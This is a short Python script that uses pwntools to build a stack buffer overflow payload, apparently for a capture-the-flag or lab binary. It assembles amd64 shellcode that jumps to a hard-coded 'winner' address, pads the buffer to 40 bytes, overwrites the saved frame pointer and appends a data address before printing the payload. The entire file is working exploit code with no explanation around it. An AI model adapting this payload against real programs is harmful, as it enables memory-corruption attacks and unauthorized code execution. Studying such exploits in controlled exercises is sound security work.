import pwnlib
import struct
from pwn import pack


#DATA_ADDR = 0x00007fffffef6030
DATA_ADDR = "\x30\x60\xef\xf7\xff\x7f\x00\x00" # 0x7fffffef6030
RBP = 0x7fffffffe668
WINNER_ADDR = 0x400af3

pwnlib.context.arch = 'amd64'
shellcode = pwnlib.shellcraft.amd64.push(WINNER_ADDR)
shellcode += pwnlib.shellcraft.amd64.ret()

shellcode = pwnlib.asm.asm(shellcode, arch='amd64')

buf = shellcode + "A" * (40 - len(shellcode))
buf += struct.pack("<Q", RBP)
buf += " "
buf += DATA_ADDR

print buf